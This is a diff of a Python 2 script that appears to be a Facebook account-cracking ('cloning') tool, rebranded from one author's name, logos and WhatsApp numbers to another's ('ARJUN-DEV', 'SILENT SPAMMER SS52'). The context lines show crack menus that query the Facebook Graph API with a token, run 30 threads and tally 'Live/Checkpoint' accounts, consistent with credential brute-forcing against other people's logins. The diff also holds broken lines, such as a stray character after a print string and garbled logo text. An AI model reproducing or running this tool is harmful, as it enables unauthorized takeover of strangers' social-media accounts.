@@ -19,7 +19,7 @@ br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
 def keluar():
-	print "\x1b[1;91mExit"
+	print "\x1b[1;91mExit"L
 	os.sys.exit()
 
 def acak(b):
@@ -55,31 +55,18 @@ S='\033[1;96m'
 P='\033[1;95m'
 Y='\033[1;93m'
 
-#Dev:JAM_SHAHRUKH
+#Dev:Arjun-Dev
 ##### LOGO #####
 logo = """
 \033[1;96m
-░░░░░██╗░█████╗░███╗░░░███╗
-░░░░░██║██╔══██╗████╗░████║
-░░░░░██║███████║██╔████╔██║
-██╗░░██║██╔══██║██║╚██╔╝██║
-╚█████╔╝██║░░██║██║░╚═╝░██║
-░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
-\033[1;93m\033[1;92m\033[1;93m WhatsApp Num \033[1;94m\033[1;95m\033[1;93m  \033[1;96m\033[1;93m +971528752764 \033[1;92m\033[1;95m
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
-logo2 = """
-\033[1;96m▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇▇▇\033[1;91m▇▇▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇
-\033[1;96m▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇ J\033[1;91m J ▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇
-\033[1;96m▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇ A\033[1;91m A ▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇
-\033[1;96m▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇ M\033[1;91m M ▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇
-\033[1;96m▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇ J\033[1;91m J ▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇
-\033[1;96m▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇ A\033[1;91m A ▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇
+ARJUN DEV NATH POWERED BY SS 52 
+░░033[1;91m A ▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇
 \033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇ M\033[1;91m M ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
 \033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇▇▇\033[1;91m▇▇▇▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
-\033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m     ▇▇  +971528752764 ▇▇
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m     ▇▇  +80377364 ▇▇
+\033[1;95m«-----------------\033[1;91mARJUN\033[1;95m-----------------»"""
 logo3 = """
-\033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m     ▇▇  +971528752764 ▇▇"
+\033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m     ▇▇  +80377364 ▇▇"
 ___________________$$$$$$
 _______________$$$__$$_$$$
 _______________$____¶¶___$$§§
@@ -115,7 +102,7 @@ _______$$$$$$$$$$_$$$________________________$$$
 ____________________$$$$__________________$$$$
 ________________________$$$$$$$$$$$$$$$$$$$
  
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN DEV\033[1;95m-----------------»"""
 logo4 = """
 \033[1;96m
 ____#
@@ -165,7 +152,7 @@ _____________§$____________#$$
 _______________#$$§#______$$$
 _________________§$§#$$$$##
  
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN\033[1;95m-----------------»"""
 logo5 = """
 \033[1;91m•____________¶¶¶1¶¶_________¶¶¶¶¶¶¶___________ 
 _________¶¶¶111¶¶___________¶¶111¶¶¶¶________ 
@@ -185,7 +172,7 @@ ____¶¶¶¶____________¶¶¶¶¶¶___________¶¶¶¶____
 ______¶¶¶__________¶¶¶__¶¶¶__________¶¶______ 
 _______¶¶¶_________¶______¶_________¶¶¶______
  
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN-DEV\033[1;95m-----------------»"""
 logo6 = """
 \033[1;93m•_____________$$$$
 ____________$$$$$$$
@@ -211,7 +198,7 @@ _________$$_____$______$$$
 __________$$____ ______$$$
 ____________$$$___$$$$$
      
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mArjun-Dev\033[1;95m-----------------»"""
 logo7 = """
 \033[1;92m•___________$_____$_____$
 _____$____$$_____$______$$____$
@@ -239,7 +226,7 @@ ___$$____$$___$$$$$$$___$$____$$
 ____$$____$____$$$$$____$____$$
 _____$_____$___________$_____$
 ______$____$___________$____$
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN-DEV\033[1;95m-----------------»"""
 logo8 = """
 \033[1;95m	
                      .ed$$$" ""$$$$$be.
@@ -271,7 +258,7 @@ logo8 = """
         .$"        .z*"               ^*$e.   "*****e.
         $$ee$c   .d"                     "*$.        3.
         ^*$E")$..$"                         *   .ee==d%
-           $.d$$$*     JAM-SHAHRUKH           *  J$$$e*
+           $.d$$$*     *  we Are Silent SS52
             $$$$                            "$$$"
 
 \033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
@@ -338,10 +325,10 @@ $$$$$$$$$$$  o$""$$$$$$$$$$        $$$$$$$$$$$                "o
                                          "$$$$$$$$$$$$""
                                            "$$$$$$$$"
 
-                                             "JAM-SHAHRUKH"
+                                             "SILENT SPAMMERS
                                                
  
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN DEV\033[1;95m-----------------»"""
 logo10 = """
 \033[1;93m
                         z$b
@@ -356,7 +343,7 @@ logo10 = """
                         $P*$
                        4P  *r
                        4    %
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN\033[1;95m-----------------»"""
 logo11 = """
 \033[1;96m                                             
         _______           
@@ -377,7 +364,7 @@ YOOo      OOO      oOOP
    `OOOOOI```IOOOOO'
     `OOOOI,,,IOOOO'
      `OOOOOOOOOOO'
-       `~OOOOO~'   JAM-SHAHRUKH
+       `~OOOOO~'   ARJUN-DEV
 
 \033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
 logo12 = """
@@ -386,7 +373,7 @@ logo12 = """
 ░║░║║║║╠╣░░░╚╗║║║║║░╠╣░╚╗░ ░╠╣║║║╗╚╗░
 ░╩╝╚╝╚╝╩═╝░░╚╝╝╝╝╩╚═╚═╝╚╝░ ░╝╝╚╝╚╝╚╝░
 ~♥~ ?̵̡?̵̨̄?✿(◡‿◡)♥☸~♥~♥~ ?̵̡?̵̨̄?✿(◡‿◡)♥☸~♥~♥~ ?̵̡?̵̨̄?✿
- 
+ SILENT SPAMMER SS52
 \033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
 logo13 = """
 \033[1;95m•JAM-SHAHRUKH	
@@ -402,7 +389,7 @@ logo13 = """
              :X- M$$$$ \033[1;93mJAM \033[1;95m`"T#$T~!8$WUXU~
             :%`  ~#$$$m:        ~!~ ?$$$$$$
           :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
-.....   -~~:<` !    ~?T#$$@@W@*?$$ \033[1;93mSHAHRUKH \033[1;95m/`
+.....   -~~:<` !    ~?T#$$@@W@*?$$ \033[1;93mARJUN \033[1;95m/`
 W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
 #"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
 :::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
@@ -410,12 +397,12 @@ W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
 Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
 $R@i.~~ !     :   ~$$$$$B$$en:``     
 ?MXT@Wx.~    :     ~"##*$$$$M~      
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN\033[1;95m-----------------»"""
 logo14 = """
 \033[1;96m            ___           _,.---,---.,_
             |         ,;~'             '~;, 
             |       ,;                     ;,      
-   Frontal  |      ;                         ; ,--- JAM-SHAHRUKH TECHNICAL 
+   Frontal  |      ;                         ; ,--- LITON-TECH
     Bone    |     ,'                         /'
             |    ,;                        /' ;,
             |    ; ;      .           . <-'  ; |
@@ -435,7 +422,7 @@ Zygomatic  |      .~  (__,.--" .^. "--.,__)  ~.
               |         \   .       . <-x---- Mental Foramen
               |__         \.    ^    ./   
                             ^~~~^~~~^                                
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN\033[1;95m-----------------»"""
 logo15 = """
 \033[1;92m•                      _____ 
             ¸,.-~·*¨.::::::::::¨*·~-.,¸ 
@@ -462,7 +449,7 @@ logo15 = """
 :    :¯¯¯:     :  `·´¯¯`·. :  :  .·´.·´_.·´`·.': :   `·.: 
 |`·._`·..·´   ¸.·|`·.·´¯`·.·´|`·.|·´_____.·.(·'_.|   '.·'_
 `·.|.·´__.·´ .·´`·.|.·´`·.|·´`·.¸||______|/\||_'|/   |__|/ 
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN DEV\033[1;95m-----------------»"""
 logo16 = """
 \033[1;92m	
                             (
@@ -498,7 +485,7 @@ logo16 = """
        (: <     ):  --:   ^  \  )(   )\/:   /   /_/ ) :._) :
         \..)   (_..  ..  :    :  : .(   \..:..    ./__.  ./
                    ^    ^      \^ ^           ^\/^     ^
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN-DEV\033[1;95m-----------------»"""
 logo17 = """
 \033[1;91m                       uuuuuuuuuuuuuuuuuuuuu.
                    .u$$$$$$$$$$$$$$$$$$$$$$$$$$W.
@@ -547,7 +534,7 @@ $$         $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                               $$$$$$$$$$$$$$$$$$$$$$!
                             $$$$$$$$$$$$$$$$$$$$$$$`
                              $$$$$$$$$$$$$$$$$$$$"
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN-DEV\033[1;95m-----------------»"""
 logo18 = """
 \033[1;93m                         __________
                       .~#########%%;~.
@@ -572,7 +559,7 @@ X  \...X     @#%,.@   |# # # % ; ; ;,|   @#%,.@     X.../  X
       ` ,                @#%,.@  @@                `
                           @@@  @@@  
 
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN-DEV\033[1;95m-----------------»"""
 logo19 = """
 \033[1;91m•	
      .... NO! ...                  ... MNO! ...
@@ -599,7 +586,7 @@ logo19 = """
          ................................
 
                                     `    `             
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN-DEV\033[1;95m-----------------»"""
 logo20 = """
 \033[1;95m	
              nHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHn.
@@ -662,7 +649,7 @@ HMMMMXM~                                MM>
                    MMMMMMMMMMMMMMMMMMM                  MMMM
                    XMMMMM
 
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mATJUN-DEV\033[1;95m-----------------»"""
 logo21 = """	
 \033[1;92m
  #
@@ -709,7 +696,7 @@ logo21 = """
                                   ###
                                   ##
                                   #
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN-DEV\033[1;95m-----------------»"""
 logo22 = """
 \033[1;95m
    _____           _   _           
@@ -720,16 +707,16 @@ logo22 = """
   \_____|\___/ \__,_| |_.__/ \__, |
                               __/ |
                              |___/ 
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN-DEV\033[1;95m-----------------»"""
 logo23 = """
-\033[1;96m    JAM-SHAHRUKH  Report 
+\033[1;96m    ARJUN Report 
 \033[1;95m ____                       _
 \033[1;95m|  _ \ ___ _ __   ___  _ __| |_
 \033[1;95m| |_) / _ \ '_ \ / _ \| '__| __|
 \033[1;95m|  _ <  __/ |_) | (_) | |  | |_
 \033[1;95m|_| \_\___| .__/ \___/|_|   \__|
 \033[1;95m          |_|
-\033[1;96m    JAM-SHAHRUKH  Report 
+\033[1;96m    ARJUN-DEV  Report 
 \033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
 logo24 = """
 \033[1;96m JAM-SHAHRUKH  Information 
@@ -783,14 +770,9 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 \033[1;96m
-░░░░░██╗░█████╗░███╗░░░███╗
-░░░░░██║██╔══██╗████╗░████║
-░░░░░██║███████║██╔████╔██║
-██╗░░██║██╔══██║██║╚██╔╝██║
-╚█████╔╝██║░░██║██║░╚═╝░██║
-░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
+░░░░░█═╝WE ARE SILENT SPAMMER FIGHT FOR PEOPLE 
                                      
-\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mARJUN-DEV\033[1;95m-----------------»"""
 jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇     ╭━━━━╮╱▔▔▔╲      ▇▇▇▇▇▇┳┻┳┻┳┻")
 jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ┃╯╯╭━┫▏╰╰╰▕      ▇▇▇▇▇▇┻┳┻┳┻┳")
 jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇     ┃╯╯┃▔╰┓▔▂▔▕╮     ▇▇▇▇▇▇┳┻┳┻┳┻")
@@ -802,16 +784,16 @@ jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇       ┃┈▕╲▂╱┈╭�
 jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇       ┃'''┈┃┈┃┈'''   ▇▇▇▇▇▇┻┳┻┳┻┳")
 jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ┏╯▔'''╰┓┣━┳┫     ▇▇▇▇▇▇┳┻┳┻┳┻")
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
-jalan("\033[1;93m▇▇\033[1;95m           WellCome to JAM-SHAHRUKH   \033[1;93m▇▇")
+jalan("\033[1;93m▇▇\033[1;95m           WellCome to ARJUN-DEV   \033[1;93m▇▇")
 jalan("\033[1;93m▇▇\033[1;91m             👇Tool Using Tips👇      \033[1;93m▇▇")
 jalan("\033[1;93m▇▇\033[1;92m            Tool Update After-Week    \033[1;93m▇▇")
 jalan("\033[1;93m▇▇\033[1;92m        Termux Data Clear After-Week  \033[1;93m▇▇")
-jalan("\033[1;93m▇▇\033[1;92m         WhatsApp  Num +971528752764  \033[1;93m▇▇")
+jalan("\033[1;93m▇▇\033[1;92m         WhatsApp  Num +880155255252*  \033[1;93m▇▇")
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
-print "\033[1;95m«-----------------\033[1;91mJAM-SHAHRUKH\033[1;95m-----------------»"
+print "\033[1;95m«-----------------\033[1;91mARJUN-DEV\033[1;95m-----------------»"
 
-CorrectUsername = "jam"
-CorrectPassword = "jam"
+CorrectUsername = "arjun"
+CorrectPassword = "liton"
 
 loop = 'true'
 while (loop == 'true'):
@@ -819,15 +801,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97m🗝 \x1b[1;91mTool Password  \x1b[1;97m»» \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:JAM_SHAHRUKH
+            print "Logged in successfully as " + username #Dev:ARJUN-DEV
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+            os.system('xdg-open https://m.youtube.com/channel/')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+        os.system('xdg-open https://m.youtube.com/channe')
 
 ##### LICENSE #####
 #=================#
@@ -1299,8 +1281,8 @@ def pilih_crack():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mARJUN-DEV\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By ARJUN-DEV--•◈•---»" #Dev:ARJUN-DEV
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;95mNext Type (python2 jam.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mCheckpoint \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
@@ -1309,10 +1291,10 @@ def pilih_crack():
  Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....JAM-SHAHRUKH....... \033[1;95m :
+: \033[1;91m ....ARJUN-DEV....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;91m +971528752764"""
+              \033[1;91m +8801773736**"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	crack()
@@ -1371,7 +1353,7 @@ def pilih_hack():
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;95m         Start Cloning Indonesia ')
+        jalan(' \033[1;95m         Start Cloning SILENT SS52 ')
 	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
 	
 			
@@ -1381,7 +1363,7 @@ def pilih_hack():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Jam_Shahrukh
+			pass #Dev:ARJUN-DEV
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -1492,8 +1474,8 @@ def pilih_hack():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mARJUN-DEV\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By ARJUN-DEV--•◈•---»" #Dev:ARJUN-DEV
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;95mNext Type (python2 jam.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
@@ -1501,10 +1483,10 @@ def pilih_hack():
 Don't Worry Your Error ID Will Be Open After 7 Days 
 
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....JAM-SHAHRUKH....... \033[1;95m :
+: \033[1;91m ....ARJUN-DEV....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;91m +971528752764"""
+              \033[1;91m +880155544****"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	crack()
@@ -1573,7 +1555,7 @@ def pilih_black():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Jam_Shahrukh
+			pass #Dev:ARJUN.DEV
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -1684,8 +1666,8 @@ def pilih_black():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mARJUN.\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ DEV▬•◈•"
+	print "  \033[1;91m«---•◈•---Developed By ARJUN-DEV--•◈•---»" #Dev:ARJUN-DEV
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;95mNext Type (python2 jam.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
@@ -1693,10 +1675,10 @@ def pilih_black():
  Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....JAM-SHAHRUKH....... \033[1;95m :
+: \033[1;91m ....LITON MOLLA...... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;91m +971528752764"""
+              \033[1;91m +88016644***"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	crack()
@@ -1876,7 +1858,7 @@ def pilih_mafia():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mJAM-SHAHRUKH\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By JAM-SHAHRUKH--•◈•---»" #Dev:Jam_Shahrukh
+	print "  \033[1;91m«---•◈•---Developed By ARJUN-DEV--•◈•---»" #Dev:Jam_Shahrukh
 	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;95mNext Type (python2 jam.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
@@ -1885,10 +1867,10 @@ def pilih_mafia():
 Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;94m .....JAM-SHAHRUKH....... \033[1;97m :
+: \033[1;94m .....ARJUN-DEV...... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;94m +971528752764"""
+              \033[1;94m +880157776**"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	crack()
@@ -1957,7 +1939,7 @@ def pilih_test():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Jam_Shahrukh
+			pass #Dev:Arjun-dev
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -2077,10 +2059,11 @@ def pilih_test():
 Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;94m .....JAM-SHAHRUKH....... \033[1;97m :
+: \033[1;94m .....ARJUN-DEV \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;94m +971528752764"""
+              \033[1;94m +880******
+	    """
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	crack()
@@ -2267,10 +2250,10 @@ def pilih_super():
 Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;94m .....JAM-SHAHRUKH....... \033[1;97m :
+: \033[1;94m .....ARJUN-DEV....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;94m +971528752764"""
+              \033[1;94m +880*******"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	crack()
@@ -2646,10 +2629,10 @@ def pilih_phone():
  Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;94m .....JAM-SHAHRUKH....... \033[1;97m :
+: \033[1;94m .....ARJUN-DEV...... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;94m +971528752764"""
+              \033[1;94m +88017737***"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	crack()
@@ -2838,10 +2821,10 @@ def pilih_mail():
 Don't Worry Your Checkpoint ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;94m .....JAM-SHAHRUKH....... \033[1;97m :
+: \033[1;94m .....ARJUN-DEV... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
-              \033[1;94m +971528752764"""
+              \033[1;94m +800177272772"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	crack()
@@ -2910,7 +2893,7 @@ def pilih_isi():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Jam_Shahrukh 
+			pass #Dev:ARJUN-DEV
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -3020,8 +3003,8 @@ def pilih_isi():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
